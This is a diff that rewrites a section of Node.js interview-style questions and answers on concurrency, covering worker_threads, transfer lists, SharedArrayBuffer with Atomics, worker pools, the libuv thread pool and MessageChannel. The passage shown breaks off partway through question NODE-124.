@@ -1,10 +1,10 @@
 # NODE03 — Concurrency, workers, and processes
 
-Node.js 20/22. Questions NODE-101–NODE-150.
+Node.js 20 and 22. Questions NODE-101–NODE-150.
 
-These questions cover running work in parallel: `worker_threads`, structured clone and transferables, `SharedArrayBuffer` and `Atomics`, worker pools, `child_process`, `cluster`, `MessageChannel`, graceful shutdown, and the isolation limits of `vm`. Event-loop phases and microtask ordering are NODE02; this section assumes them.
+These questions cover running work in parallel: `worker_threads`, structured clone and transfer lists, `SharedArrayBuffer` and `Atomics`, worker pools, `child_process`, `cluster`, `MessageChannel`, graceful shutdown, and what `vm` does not isolate. Event-loop phases and microtask order are NODE02. This section assumes that model.
 
-Async is not parallel: `async`/`await` interleaves work on one JavaScript thread, while workers, processes, and the libuv pool run work on other OS threads or processes. `UV_THREADPOOL_SIZE` sizes libuv's native pool and does not run your JavaScript. Workers never share JavaScript objects; only `SharedArrayBuffer` memory is shared.
+`async`/`await` is not parallel. It interleaves work on one JavaScript thread. Workers, child processes, and the libuv pool run work on other operating-system threads or in other processes. `UV_THREADPOOL_SIZE` sizes libuv's native pool, and that pool does not run your JavaScript. Workers never share JavaScript objects. The only memory they share is a `SharedArrayBuffer`.
 
 ### NODE-101 — Why async is not parallel
 
@@ -18,13 +18,13 @@ A teammate says wrapping CPU-heavy functions in `async` and awaiting them with `
 
 **Answer:**
 
-No. `async` interleaves continuations on one JavaScript thread; it does not create threads. A CPU-bound function runs to completion on the main thread before the loop can run anything else, so `Promise.all` over ten of them takes about ten times as long as one. Async helps when work is waiting on I/O that the OS or libuv performs elsewhere. For CPU parallelism you need workers, child processes, or cluster.
+`async` schedules continuations on the one JavaScript thread. It does not create threads, so the functions do not run at the same time. A CPU-bound function holds that thread until it returns, and the event loop cannot run anything else while it does. `Promise.all` over ten of those functions still does the work one after another, so the wait is about ten times one call. Async pays off when the wait is I/O that the operating system or libuv performs elsewhere. CPU parallelism needs workers, child processes, or cluster.
 
 **Follow-up:**
 
 How would you spot this in production?
 
-Answer: Rising event-loop delay and p99 latency, timers firing late, and one CPU core pinned near 100% while others idle. `perf_hooks.monitorEventLoopDelay()` makes the stall visible.
+Answer: Event-loop delay and tail latency rise, timers fire late, and one core sits near full while the others stay idle. `perf_hooks.monitorEventLoopDelay()` makes that stall visible.
 
 ### NODE-102 — Why I/O scales on one thread and CPU does not
 
@@ -38,13 +38,13 @@ Why can one Node thread serve thousands of concurrent sockets but not thousands 
 
 **Answer:**
 
-Socket I/O is handed to the OS (epoll, kqueue, IOCP); JavaScript only runs briefly when data is ready, so waiting costs no thread. A JavaScript computation holds the thread for its whole duration, and nothing else on that thread, including every other connection's callbacks, can run meanwhile. Concurrency of waiting is cheap; concurrency of computing needs more cores.
+A socket wait is handed to the operating system, through epoll, kqueue, or IOCP. JavaScript runs only for a short turn when data is ready, so a connection that is waiting does not occupy a thread. A hash computation holds the JavaScript thread for its whole duration. While it runs, no other callback on that thread can start, including every other connection. Waiting on many sockets is cheap because the thread is free between events. Computing many hashes needs more cores, because each hash consumes the thread the whole time.
 
 **Follow-up:**
 
 Is the cost always CPU time?
 
-Answer: No. Anything synchronous blocks: `fs.readFileSync`, large `JSON.parse`, catastrophic regex backtracking, and `zlib.*Sync` all hold the loop even without much CPU parallelism to gain.
+Answer: No. Anything synchronous holds the loop, including `fs.readFileSync`, a large `JSON.parse`, catastrophic regex backtracking, and `zlib` sync methods. Those stall other callbacks even when there is no parallel CPU work to gain.
 
 ### NODE-103 — Options for CPU-heavy work
 
@@ -54,17 +54,17 @@ Answer: No. Anything synchronous blocks: `fs.readFileSync`, large `JSON.parse`, 
 
 **Question:**
 
-A request handler must resize images or hash large payloads. List the ways to keep the event loop responsive and when you would pick each.
+A request handler must resize images or hash large payloads. List the ways to keep the event loop responsive, and when you would pick each.
 
 **Answer:**
 
-Worker threads for in-process CPU work with cheap messaging. Child processes for other binaries or hard isolation. Cluster or multiple replicas to scale request handling across cores. Native addons or async crypto/zlib that use libuv's pool. Chunking with `setImmediate` for small slices of work. A separate service or queue worker when the job is long or must survive restarts. Choose by isolation needs, payload size, and whether the work is request-scoped or background.
+Worker threads fit in-process CPU work when messages stay small. A child process fits another binary, or a crash you can kill without the parent. Cluster, or several replicas, spreads requests across cores. Native addons and async crypto or zlib use libuv's pool for work already written in C. `setImmediate` between chunks suits a short loop you can pause. A queue and a separate service fit a job that is long or must survive a restart. Choose by isolation, payload size, and whether the work is one request or background.
 
 **Follow-up:**
 
 Why is chunking with `setImmediate` a weak default?
 
-Answer: It only yields; the total CPU time is unchanged and still on the main thread, and slicing logic adds complexity. It suits small, interruptible loops, not heavy compute.
+Answer: It only yields the thread. The total CPU time is unchanged and still on the main thread, and the slicing logic is extra code. It suits a small loop you can pause, not heavy compute.
 
 ### NODE-104 — What a worker thread is
 
@@ -78,13 +78,13 @@ What is a `worker_threads` worker, and how does it differ from a thread in Java 
 
 **Answer:**
 
-A worker is an extra V8 isolate with its own heap, event loop, and module graph, running on its own OS thread inside the same process. It cannot touch the parent's JavaScript objects. Communication is by message passing (structured clone) or by shared `SharedArrayBuffer` memory. Unlike Java or C++ threads there are no shared mutable objects and no locks over a common heap. Startup is on the order of tens of milliseconds and several megabytes per worker, so you pool them.
+A worker is another V8 isolate in the same process, with its own heap, event loop, and module graph, on its own operating-system thread. It cannot touch the parent's JavaScript objects. You send copies, or you share a `SharedArrayBuffer`. A Java or C++ thread mutates one heap and needs locks. A worker has no shared objects and no locks on a common heap. Startup and the private heap cost on the order of tens of milliseconds and a few megabytes, so you pool workers instead of starting one per task.
 
 **Follow-up:**
 
-Does a worker share `require` cache or module state with the parent?
+Does a worker share the `require` cache or module state with the parent?
 
-Answer: No. Each worker loads its own copy of modules; module-level singletons such as DB clients are per worker.
+Answer: No. Each worker loads its own copy of every module. A module-level singleton, such as a database client, is a separate instance in each worker.
 
 ### NODE-105 — Minimal worker_threads program
 
@@ -98,25 +98,27 @@ Write the smallest ESM file that runs a computation in a worker and returns the 
 
 **Answer:**
 
+The same file is both the parent and the worker. `isMainThread` tells you which side is running. The parent starts a `Worker` pointed at this module and passes `workerData`, which Node clones once at startup. The worker reads that value and sends the result with `parentPort.postMessage`. Later inputs also go through `postMessage`, not through `workerData`. Listen for `'error'` as well as `'message'`, or a thrown exception in the worker can surface as an unhandled error in the parent.
+
+**Code:**
+
 ```js
 import { Worker, isMainThread, parentPort, workerData } from 'node:worker_threads';
 
 if (isMainThread) {
-  const w = new Worker(new URL(import.meta.url), { workerData: 21 });
-  w.on('message', (m) => console.log(m));   // 42
-  w.on('error', console.error);
+  const worker = new Worker(new URL(import.meta.url), { workerData: 21 });
+  worker.on('message', (n) => console.log(n));
+  worker.on('error', console.error);
 } else {
   parentPort.postMessage(workerData * 2);
 }
 ```
 
-`workerData` is cloned once at startup; later data goes through `parentPort.postMessage`.
-
 **Follow-up:**
 
 How do you await a one-shot result?
 
-Answer: Wrap it in a Promise that resolves on `'message'` and rejects on `'error'` and on `'exit'` with a non-zero code, then clean up listeners.
+Answer: Wrap the worker in a promise that resolves on `'message'`. Reject on `'error'`, and on `'exit'` when the code is non-zero, then remove the listeners so the worker can be collected.
 
 ### NODE-106 — What postMessage does to its payload
 
@@ -130,13 +132,13 @@ What happens to an object passed to `worker.postMessage()`, and what can it not 
 
 **Answer:**
 
-It is copied with the structured clone algorithm. Supported: primitives, plain objects, arrays, `Map`, `Set`, `Date`, `RegExp`, `BigInt`, typed arrays, `ArrayBuffer`, and `Error` (with limits). Not supported: functions (throws `DataCloneError`), symbols as values, and prototype/class identity, so a class instance arrives as a plain object without methods. The copy is O(size), so very large payloads can cost more than the work saved.
+`postMessage` copies the value with the structured clone algorithm, then delivers that copy to the other side. The copy can hold primitives, plain objects, arrays, `Map`, `Set`, `Date`, `RegExp`, `BigInt`, typed arrays, `ArrayBuffer`, and `Error`, with some limits on error fields. It cannot hold functions, and passing one throws `DataCloneError`. A symbol used as a value is not cloned. A class instance arrives as a plain object, without its prototype or methods. The copy takes time and memory proportional to the size, so a huge payload can cost more than the work you hoped to move.
 
 **Follow-up:**
 
 Does mutating the object after `postMessage` affect the receiver?
 
-Answer: No. The clone is taken at send time; both sides then have independent objects.
+Answer: No. The clone is taken when you send. After that, each side has its own object, and later writes stay on the side that made them.
 
 ### NODE-107 — Transferables and when to use them
 
@@ -150,13 +152,13 @@ What is a transferable object, and when does using one beat a normal `postMessag
 
 **Answer:**
 
-A transferable moves ownership instead of copying. `ArrayBuffer` and `MessagePort` are the common ones (also `FileHandle`, `X509Certificate`-style handles in some versions). `port.postMessage(buf, [buf])` is O(1) regardless of size. Use it for large binary payloads such as image frames, audio, or parsed buffers. The tradeoff is that the sender loses access.
+A transferable moves ownership of a resource instead of copying its bytes. `ArrayBuffer` and `MessagePort` are the common cases. Some handle types, such as a file handle, can be transferred too. You pass the objects in the transfer list: `postMessage(buffer, [buffer])`. That move is effectively constant time, whatever the buffer's size, which is why it beats a clone for image frames, audio, or other large binary payloads. The sender gives the memory up. After the send, the sender's buffer is detached and no longer usable.
 
 **Follow-up:**
 
-What do you pass in the transfer list for a typed array?
+What do you put in the transfer list for a typed array?
 
-Answer: The underlying `ArrayBuffer`: `postMessage(view, [view.buffer])`. Transferring the view alone does not detach anything.
+Answer: The underlying `ArrayBuffer`, as in `postMessage(view, [view.buffer])`. Putting only the view in the list does not detach the buffer.
 
 ### NODE-108 — State of a transferred ArrayBuffer
 
@@ -170,13 +172,13 @@ After `postMessage(buf, [buf])`, what is the state of `buf` on the sender, and w
 
 **Answer:**
 
-It is detached: `buf.byteLength` is `0` and views over it have length `0`, so reads return nothing useful. Only the receiver owns the memory. Transferring a detached buffer again throws `DataCloneError`. Keep one clear owner per buffer and design the protocol so buffers return to the sender or are replaced.
+The sender's buffer is detached. `byteLength` becomes 0, and any view over that buffer also reports length 0, so reads no longer see the old bytes. Only the receiver owns the memory. Transferring a buffer that is already detached throws `DataCloneError`. Design the protocol so each buffer has one clear owner at a time. Either the receiver keeps it, sends a replacement, or transfers it back when the work is done.
 
 **Follow-up:**
 
-How do pools reuse buffers without reallocating?
+How do pools reuse buffers without allocating a new one every task?
 
-Answer: Send the buffer back to the parent by transfer after the worker is done, forming a ring, or use `SharedArrayBuffer` with explicit synchronization.
+Answer: Transfer the buffer back to the parent when the worker finishes, and hand that same buffer out again, like a ring. Or share one `SharedArrayBuffer` and synchronize access explicitly.
 
 ### NODE-109 — What SharedArrayBuffer is
 
@@ -190,13 +192,13 @@ What is a `SharedArrayBuffer`, and how does it differ from transferring an `Arra
 
 **Answer:**
 
-A fixed-size block of memory that several threads map at once. Each thread wraps it in its own typed array (`new Int32Array(sab)`) and sees the same bytes. Posting it shares the memory; nothing is copied or detached. It is the only mutable shared memory between workers. Because access is concurrent, you must synchronize with `Atomics` or accept races.
+A `SharedArrayBuffer` is one fixed block of bytes that several threads map at the same time. Each thread wraps it in its own typed array, such as `new Int32Array(shared)`, and those views see the same memory. Posting the buffer shares it. Nothing is copied, and nothing is detached. An ordinary `ArrayBuffer` transfer moves the memory so the sender loses it. A shared buffer is the only mutable memory workers share. Because both sides can write at once, you synchronize with `Atomics`, or you accept data races.
 
 **Follow-up:**
 
-Can it hold JavaScript objects?
+Can a `SharedArrayBuffer` hold JavaScript objects?
 
-Answer: No. Only bytes, interpreted through typed arrays or `DataView`. Structured data needs a manual binary layout.
+Answer: No. It holds bytes, which you read through a typed array or a `DataView`. Structured values need a layout you define yourself.
 
 ### NODE-110 — Why Atomics are needed
 
@@ -206,17 +208,17 @@ Answer: No. Only bytes, interpreted through typed arrays or `DataView`. Structur
 
 **Question:**
 
-Two workers run `counter[0]++` on a shared `Int32Array` 100,000 times each. Why is the result wrong, and what fixes it?
+Two workers each run `counter[0]++` on a shared `Int32Array` 100,000 times. Why is the result wrong, and what fixes it?
 
 **Answer:**
 
-`counter[0]++` is read, add, write; two threads can read the same value and both write back, losing increments, and plain accesses carry no ordering guarantees. `Atomics.add(counter, 0, 1)` performs the operation indivisibly with sequentially consistent ordering. Also available: `load`, `store`, `exchange`, `compareExchange`, `and`, `or`, `xor`, `sub`.
+`counter[0]++` is three steps: read the cell, add one, and write it back. Two threads can read the same value and both write that value plus one, so one increment disappears. A plain load or store also does not give you ordering against other memory. `Atomics.add(counter, 0, 1)` does the add as one indivisible operation, with sequentially consistent ordering, so both workers' increments survive. The same family includes `load`, `store`, `exchange`, `compareExchange`, and the bitwise and arithmetic updates `and`, `or`, `xor`, and `sub`.
 
 **Follow-up:**
 
 Which typed arrays work with `Atomics`?
 
-Answer: Integer typed arrays over a buffer, such as `Int32Array`, `Uint32Array`, and `BigInt64Array`. Not floats or clamped arrays.
+Answer: Integer arrays backed by a buffer, such as `Int32Array`, `Uint32Array`, and `BigInt64Array`. Float arrays and `Uint8ClampedArray` do not.
 
 ### NODE-111 — Atomics.wait and notify
 
@@ -230,13 +232,13 @@ How do `Atomics.wait`, `Atomics.notify`, and `Atomics.waitAsync` work, and where
 
 **Answer:**
 
-`Atomics.wait(i32, idx, expected, timeoutMs)` blocks the calling thread while the value equals `expected` until notified or timed out. `Atomics.notify(i32, idx, count)` wakes waiters. `Atomics.waitAsync` returns a promise and does not block. Node permits `wait` on the main thread, but doing so freezes the event loop, so use blocking `wait` only inside workers and `waitAsync` where the loop must stay free. Always re-check the condition in a loop to handle spurious wakeups.
+`Atomics.wait` puts the calling thread to sleep while an `Int32Array` cell still equals the value you expected, until another thread notifies that index or the timeout elapses. `Atomics.notify` wakes one or more of those waiters. `Atomics.waitAsync` does not block. It returns a promise that settles when the wait ends, so the thread can keep running its event loop. Node allows blocking `wait` on the main thread, but that freezes every callback, so use it only inside a worker. Use `waitAsync` where the loop must stay responsive. Always re-check the condition in a loop, because a wake can be spurious.
 
 **Follow-up:**
 
 What does `wait` return?
 
-Answer: `"ok"` if notified, `"not-equal"` if the value did not match at call time, `"timed-out"` after the timeout.
+Answer: `"ok"` when another thread notified you, `"not-equal"` when the cell did not match at the call, and `"timed-out"` when the timeout elapsed first.
 
 ### NODE-112 — A mutex built on Atomics
 
@@ -246,17 +248,17 @@ Answer: `"ok"` if notified, `"not-equal"` if the value did not match at call tim
 
 **Question:**
 
-Sketch a mutex using a shared `Int32Array` cell, and name its failure modes.
+Sketch a mutex using one shared `Int32Array` cell, and name its failure modes.
 
 **Answer:**
 
-States: `0` unlocked, `1` locked. Lock: loop on `Atomics.compareExchange(i32, 0, 0, 1)`; if it returns non-zero, `Atomics.wait(i32, 0, 1)`. Unlock: `Atomics.store(i32, 0, 0)` then `Atomics.notify(i32, 0, 1)`. Failure modes: a worker that crashes while holding the lock leaves it stuck, no fairness or ordering, lock-order deadlocks with multiple cells, and blocking `wait` on the main thread. Use timeouts and keep critical sections tiny.
+Use one cell: 0 means unlocked, 1 means locked. To lock, loop on `Atomics.compareExchange`, swapping 0 for 1. If it returns anything other than 0, someone else holds the lock, so `Atomics.wait` until the cell is 1 and then try again. To unlock, `Atomics.store` writes 0 and `Atomics.notify` wakes one waiter. This fails in ordinary ways. A worker that dies while holding the lock leaves it stuck. There is no fairness. Two locks taken in opposite orders deadlock. Blocking `wait` on the main thread freezes the process. Use a timeout, and keep the critical section tiny.
 
 **Follow-up:**
 
-When would you avoid this entirely?
+When would you avoid a mutex entirely?
 
-Answer: When a single owner worker can serialize access through messages. Message passing is simpler and avoids lock bugs unless profiling proves copy cost matters.
+Answer: When one owner worker can serialize the updates through messages. Message passing avoids lock bugs, and you add shared memory only when a profile shows the copies are the cost that matters.
 
 ### NODE-113 — Pitfalls of shared memory
 
@@ -270,13 +272,13 @@ What are the main risks of using `SharedArrayBuffer` in a Node service, compared
 
 **Answer:**
 
-Data races without `Atomics`, torn or inconsistent multi-field updates (only single integer cells are atomic), hand-written binary layouts, lock-order deadlocks, hard-to-reproduce bugs, and no automatic cleanup if a worker dies mid-update. The buffer is also fixed-size. Benefits are zero-copy and low latency, which matter only for large or very high-frequency data.
+Shared memory is fast because nothing is copied, which is why the risks are worth naming. Without `Atomics`, concurrent reads and writes race. Only one integer cell is atomic, so two fields can tear. You own the binary layout. Locks deadlock if threads take them in opposite orders, and a worker that dies mid-update leaves inconsistent bytes, with no rollback. The buffer cannot grow. Those bugs are hard to reproduce. Zero-copy latency matters for large or very frequent data. For occasional messages, a clone is simpler.
 
 **Follow-up:**
 
-How do you update several fields consistently?
+How do you update several fields so a reader never sees a mix of old and new values?
 
-Answer: Guard them with a lock, use a sequence counter (seqlock) that readers retry on change, or write a new version into a separate slot and publish an index atomically.
+Answer: Guard the fields with one lock. Or use a sequence counter that makes readers retry when a write is in progress. Or write a new version into another slot and publish the index with one atomic store.
 
 ### NODE-114 — No shared JavaScript objects
 
@@ -290,13 +292,13 @@ Can two workers share a JavaScript object, such as a `Map` of cache entries?
 
 **Answer:**
 
-No. Each worker has a separate V8 heap; sending a `Map` produces an independent clone, and mutations never propagate. Cross-worker state needs message passing to an owner, a `SharedArrayBuffer` with a custom layout, or an external store such as Redis. Module-level variables are per worker, so an in-memory cache duplicates across workers and across cluster processes.
+No. Each worker has its own V8 heap. Sending a `Map` clones it, and later `set` or `delete` calls stay on the side that made them. If both workers must see the same cache, pick an owner. Either one worker holds the `Map` and the others send messages, or you put the entries in Redis or another store outside the process. A `SharedArrayBuffer` can share bytes, not objects, and only with a layout you invent. Module-level variables are per worker too, so an in-memory cache is duplicated across workers and across cluster processes.
 
 **Follow-up:**
 
-Why can't engines simply share a heap?
+Why can't the engine simply share one heap between workers?
 
-Answer: V8 isolates are single-threaded by design: objects, GC, and hidden-class state assume one mutator. Sharing would require locks on every access.
+Answer: A V8 isolate assumes one thread mutates objects, garbage collection state, and hidden classes. Sharing that heap would need a lock on essentially every access.
 
 ### NODE-115 — What a worker pool is for
 
@@ -310,13 +312,13 @@ Why use a worker pool instead of creating a worker per task?
 
 **Answer:**
 
-Each worker costs startup time (new isolate, module loading) and memory. A pool keeps a fixed number of long-lived workers plus a task queue, amortizing startup, bounding CPU and memory, and creating natural backpressure when load exceeds capacity. Per-request workers allow unbounded concurrency under load and can exhaust memory.
+Each worker pays for a new isolate and for loading its modules, in startup time and in memory. A pool keeps a fixed number of long-lived workers and a queue of tasks. Startup is paid once, CPU and memory stay bounded, and a full queue is natural backpressure when load exceeds the pool. Creating a worker per request removes that bound. Under a spike you can start workers until the process runs out of memory. The pool turns "how much parallelism" into a number you chose, instead of a number the traffic chooses.
 
 **Follow-up:**
 
-What happens to requests when all workers are busy?
+What happens to requests when every worker is busy?
 
-Answer: They wait in the queue. Bound the queue and fail fast or shed load rather than letting latency grow without limit.
+Answer: They wait in the queue. Cap that queue and fail or shed load once it is full, instead of letting latency grow without a limit.
 
 ### NODE-116 — Designing a worker pool
 
@@ -330,13 +332,13 @@ Outline the core mechanics of a promise-based worker pool.
 
 **Answer:**
 
-Keep an idle-worker list, a FIFO queue, and a map from task id to `{resolve, reject}`. `run(payload)` returns a promise; if a worker is idle, mark it busy and `postMessage({id, payload})`, otherwise enqueue. On `'message'`, settle by id, mark the worker idle, and pull the next queued task. On `'error'` or `'exit'`, reject the in-flight task and spawn a replacement. Add a queue limit, per-task timeout, and a `destroy()` that drains and terminates.
+Keep three structures: a list of idle workers, a FIFO queue of tasks, and a map from task id to the promise's resolve and reject. `run` returns a promise. If a worker is idle, mark it busy and `postMessage` the id and payload. Otherwise enqueue the task. On `'message'`, settle the promise for that id, mark the worker idle, and pull the next queued task. On `'error'` or `'exit'`, reject the in-flight task and start a replacement worker. Add a queue limit, a per-task timeout, and a `destroy` that stops intake, waits or abandons in-flight work, and terminates the workers.
 
 **Follow-up:**
 
 How do you cancel a task that is already running?
 
-Answer: You cannot interrupt synchronous JS in a worker cooperatively; terminate and replace that worker, or have long tasks check a shared flag or message periodically.
+Answer: You cannot cooperatively pause synchronous JavaScript inside the worker. Terminate that worker and replace it, or have long tasks periodically check a shared flag or an incoming message.
 
 ### NODE-117 — Use a library or write a pool
 
@@ -346,17 +348,17 @@ Answer: You cannot interrupt synchronous JS in a worker cooperatively; terminate
 
 **Question:**
 
-Which pool libraries exist, and why prefer one over a hand-rolled pool?
+Which pool libraries are the usual choices, and why prefer one over a pool you write yourself?
 
 **Answer:**
 
-`piscina` is the common choice (queueing, `AbortSignal` cancellation, idle timeouts, resource limits, transferables support); `workerpool` and `threads.js` are alternatives. Libraries cover crash recovery, respawn, task timeouts, and shutdown ordering, where hand-rolled pools often leak workers or hang. A hand-rolled pool is acceptable for a single task type with simple needs.
+`piscina` is the common choice. It queues tasks, supports `AbortSignal` cancellation, idle timeouts, resource limits, and transfer lists. `workerpool` and `threads.js` are the usual alternatives. A library already handles the parts hand-rolled pools get wrong: respawning after a crash, task timeouts, and shutdown order. Those are where workers leak or the process hangs on exit. A pool you write is reasonable for one task type with simple needs. The moment you need cancellation, crashes, and a bounded queue together, the library is the smaller risk.
 
 **Follow-up:**
 
-What do you still own when using one?
+What do you still own when a library runs the pool?
 
-Answer: Pool sizing, queue bounds, payload design (transfer vs clone), error mapping, and shutdown wiring into your process lifecycle.
+Answer: How many workers, how long the queue may grow, whether payloads are cloned or transferred, how errors map to your API, and how shutdown hooks into the process lifecycle.
 
 ### NODE-118 — Sizing a pool
 
@@ -366,17 +368,17 @@ Answer: Pool sizing, queue bounds, payload design (transfer vs clone), error map
 
 **Question:**
 
-How many workers should a CPU-bound pool have on a container limited to 2 CPUs?
+How many workers should a CPU-bound pool have in a container limited to 2 CPUs?
 
 **Answer:**
 
-Roughly the CPU quota available to the process, often `availableParallelism()` or one less to leave room for the main thread. In containers, `os.cpus().length` reports host cores and can mislead; `os.availableParallelism()` is better but may not reflect cgroup quotas on every Node/libuv version, so verify or read the limit explicitly. Oversizing adds context switching and memory without throughput. For I/O-heavy tasks inside workers, measure instead of assuming.
+Start from the CPU the process may use, often that quota, or one less so the main thread can run the loop. `os.availableParallelism()` is the right call. `os.cpus().length` reports host cores, which in a container overshoots your limit. `availableParallelism()` may still miss the cgroup quota on some libuv versions, so confirm it. Workers past the quota add switches and memory without throughput. If the tasks are mostly I/O, measure instead of using the CPU-bound rule.
 
 **Follow-up:**
 
-How do you validate the choice?
+How do you validate the size?
 
-Answer: Load test with throughput and p99 as pool size varies, watching CPU throttling in the container and queue depth.
+Answer: Load-test throughput and tail latency as the pool size changes. Watch container CPU throttling and the queue depth, not just whether the process looks busy.
 
 ### NODE-119 — UV_THREADPOOL_SIZE versus worker threads
 
@@ -390,13 +392,13 @@ What is the difference between `UV_THREADPOOL_SIZE` and `worker_threads`?
 
 **Answer:**
 
-`UV_THREADPOOL_SIZE` (default 4, max 1024) sets the size of libuv's process-wide pool for native blocking work: many `fs` operations, `dns.lookup`, `crypto.pbkdf2`/`scrypt`/`randomBytes`, `zlib`. Those threads run C/C++ code, never your JavaScript. Worker threads run JavaScript in separate isolates. Raising the env var gives more native concurrency; it does not make a JS loop faster. Set it in the environment before the process starts, or at least before the pool is first used.
+`UV_THREADPOOL_SIZE` sets how many threads libuv keeps for native blocking work. The default is 4 and the maximum is 1024. Those threads run C or C++ for many `fs` calls, `dns.lookup`, `pbkdf2`, `scrypt`, `randomBytes`, and `zlib`. They never run your JavaScript. A worker thread is a separate isolate that does run JavaScript. Raising the environment variable adds native concurrency. It does not make a JavaScript loop faster. Set it in the environment before the process starts, or at least before anything uses the pool, because a later change is ignored.
 
 **Follow-up:**
 
-Do workers get their own libuv pool?
+Does each worker get its own libuv pool?
 
-Answer: Each worker has its own event loop, but the threadpool is shared process-wide, so heavy native work in several workers competes for the same threads.
+Answer: Each worker has its own event loop, but the libuv thread pool is shared by the whole process. Heavy native work in several workers competes for those same threads.
 
 ### NODE-120 — What uses the libuv threadpool
 
@@ -410,13 +412,13 @@ Which Node operations run on the libuv threadpool, and which do not?
 
 **Answer:**
 
-On the pool: most asynchronous `fs` calls, `dns.lookup` (`getaddrinfo`), `crypto.pbkdf2`, `scrypt`, `randomBytes`/`randomFill`, `zlib` async methods, and some native addons. Not on the pool: TCP/UDP/HTTP socket I/O (OS async mechanisms), `dns.resolve*` (c-ares), timers, and your JavaScript. Knowing the split explains why a flood of slow file operations can delay unrelated DNS lookups.
+The pool runs most asynchronous `fs` calls, `dns.lookup` because it calls `getaddrinfo`, `crypto.pbkdf2`, `scrypt`, `randomBytes` and `randomFill`, the async `zlib` methods, and some native addons. TCP, UDP, and HTTP do not use it. The kernel waits for those sockets. `dns.resolve` and the other resolver methods use c-ares on the loop, not the pool. Timers and your JavaScript do not use it either. The split matters because a flood of slow file calls can occupy the default four threads and delay an unrelated `dns.lookup` that is waiting for a free one.
 
 **Follow-up:**
 
-Why is `dns.lookup` the surprising one?
+Why is `dns.lookup` the surprising member of that list?
 
-Answer: It looks like network I/O but calls the blocking `getaddrinfo`, so slow DNS can starve the four default pool threads and stall `fs` calls.
+Answer: It looks like network I/O, but it calls the blocking `getaddrinfo`. Slow DNS can fill the four default pool threads and stall `fs` operations that need the same pool.
 
 ### NODE-121 — Diagnosing threadpool saturation
 
@@ -426,17 +428,17 @@ Answer: It looks like network I/O but calls the blocking `getaddrinfo`, so slow 
 
 **Question:**
 
-Event-loop delay is low and CPU is not saturated, yet file reads and password hashing are slow under load. What do you suspect?
+Event-loop delay is low, CPU is not saturated, and yet file reads and password hashing are slow under load. What do you suspect, and what do you change?
 
 **Answer:**
 
-Threadpool saturation. With four threads, a fifth concurrent `pbkdf2` or slow `fs` operation queues behind the others even though the JS thread is idle. Confirm by timing the operations in isolation and under load, and by checking whether latency scales with concurrent native calls. Fixes: raise `UV_THREADPOOL_SIZE`, limit concurrency of heavy native calls, separate slow filesystems, or move work to workers or another service.
+Suspect a full libuv thread pool. With four threads, a fifth concurrent `pbkdf2` or a slow `fs` call waits even though the JavaScript thread is idle and the cores are not busy. Time the call alone and under concurrency, and see whether latency grows with in-flight native calls. Then raise `UV_THREADPOOL_SIZE`, cap how many of those calls you start, or move the work to workers or another service. More threads are not automatically better. Too many add contention and memory, so size the pool from the concurrency you measured and the cores you have.
 
 **Follow-up:**
 
-Is bigger always better?
+Is a larger pool always faster?
 
-Answer: No. Too many threads cause contention and memory use; size it from measured native concurrency and available cores.
+Answer: No. Past the useful concurrency, extra threads contend and use memory. Size the pool from the native work you measured and from the cores available.
 
 ### NODE-122 — Misconceptions about UV_THREADPOOL_SIZE
 
@@ -446,17 +448,17 @@ Answer: No. Too many threads cause contention and memory use; size it from measu
 
 **Question:**
 
-Does raising `UV_THREADPOOL_SIZE` speed up a JSON-parsing or business-logic hot path?
+Does raising `UV_THREADPOOL_SIZE` speed up a hot path that is JSON parsing or ordinary business logic?
 
 **Answer:**
 
-No. That code is JavaScript on the main thread and never touches the libuv pool. The setting only adds parallelism for native tasks routed through libuv. For CPU-bound JS, offload to workers or reduce the work. Applying the knob to the wrong problem is a common interview and production mistake.
+No. That code is JavaScript on the main thread, and it never enters the libuv pool. The setting only adds threads for native tasks libuv chooses to offload, such as filesystem calls and `pbkdf2`. A CPU profile full of JavaScript frames is a main-thread or worker problem. Time spent waiting on `fs`, crypto, or `dns.lookup` while the loop itself is idle is a pool problem. For CPU-bound JavaScript, move the work to workers or do less of it. Applying this knob to a JavaScript hot path is a common miss, in interviews and in production.
 
 **Follow-up:**
 
-How do you tell which kind of bottleneck you have?
+How do you tell which bottleneck you have?
 
-Answer: A CPU profile that shows time in JS frames points to the main thread or workers; time waiting on `fs`/crypto/dns calls with an idle loop points to the pool.
+Answer: JavaScript frames in a CPU profile point at the main thread or at workers. Waiting on `fs`, crypto, or DNS while the event loop is idle points at the pool.
 
 ### NODE-123 — What MessageChannel provides
 
@@ -466,17 +468,17 @@ Answer: A CPU profile that shows time in JS frames points to the main thread or 
 
 **Question:**
 
-What is a `MessageChannel`, and what does it give you over `worker.postMessage`?
+What is a `MessageChannel`, and what does it give you that `worker.postMessage` on the worker object does not?
 
 **Answer:**
 
-It creates two entangled `MessagePort` objects. A message posted on one arrives on the other, using structured clone. Ports are transferable, so you can hand one end to a worker to create a dedicated channel, for example per request or per feature, or between two workers directly. This avoids routing everything through a single `parentPort` and the main thread.
+A `MessageChannel` creates two linked `MessagePort` objects. A message posted on one is delivered to the other, using structured clone. Ports are transferable, so you can hand one end to a worker and keep the other, or hand an end to each of two workers. That gives you a private channel per request or per feature, and it lets two workers talk without the parent relaying every message. `worker.postMessage` always goes through that one worker's `parentPort`. A dedicated port keeps that traffic off the main thread's single parent channel.
 
 **Follow-up:**
 
-Are messages ordered?
+Are messages on a port ordered?
 
-Answer: Yes, per port, in send order. There is no ordering guarantee across different ports.
+Answer: Yes, on one port, in the order they were sent. Two different ports have no order relative to each other.
 
 ### NODE-124 — Connecting two workers directly
 
@@ -486,9 +488,13 @@ Answer: Yes, per port, in send order. There is no ordering guarantee across diff
 
 **Question:**
 
-How do you let worker A and worker B talk without the main thread relaying messages?
+How do you let worker A and worker B exchange messages without the main thread relaying each one?
 
 **Answer:**
+
+Create a `MessageChannel` in the parent and transfer one port to each worker. Each worker then listens on the port it received. After that handoff, data moves between the workers and the parent is no longer on the path. The ports must be in the transfer list. Trying to clone a port throws, because a port is transferred, not copied. Each side treats the received port like any other emitter: `'message'` for data, and `'close'` when the other end goes away.
+
+**Code:**
 
 ```js
 const { port1, port2 } = new MessageChannel();
@@ -496,13 +502,11 @@ workerA.postMessage({ peer: port1 }, [port1]);
 workerB.postMessage({ peer: port2 }, [port2]);
 ```
 
-Each worker listens with `peer.on('message', ...)`. Ports must be in the transfer list; trying to clone them throws. After the handoff the main thread is out of the data path.
-
 **Follow-up:**
 
-What if one worker dies?
+What happens to the surviving worker if the other one dies?
 
-Answer: The other port is not automatically fatal, but messages go nowhere; listen for `'close'` on the port and handle peer loss explicitly.
